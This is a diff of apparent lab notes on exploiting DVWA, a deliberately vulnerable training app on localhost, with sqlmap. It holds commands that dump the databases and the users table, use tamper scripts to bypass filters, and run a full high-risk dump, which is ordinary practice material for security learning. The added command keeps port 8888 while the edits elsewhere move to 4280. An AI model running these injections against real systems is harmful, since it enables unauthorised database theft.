@@ -2,14 +2,20 @@
 # Exploit DVWA with sqlmap
 
 # Basic dump of databases (low security level)
-sqlmap -u "http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=your_session_id; security=low" \
   --batch --dbs
 
 # Dump users table
-sqlmap -u "http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=your_session_id; security=low" \
   -D dvwa -T users --dump
 
 # If medium/high security — use tamper scripts to bypass filters
 sqlmap ... --tamper=space2comment,between
+
+# Clean report ready output
+sqlmap -u "http://localhost:8888/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=xxxxxxxx; security=low" \
+  --batch --dbs --tables --dump --level=3 --risk=3 \
+  -o --output-dir=sqlmap-report-27022026-0527 2>&1 | tee sqlmap-summary-27022026-0527.txt
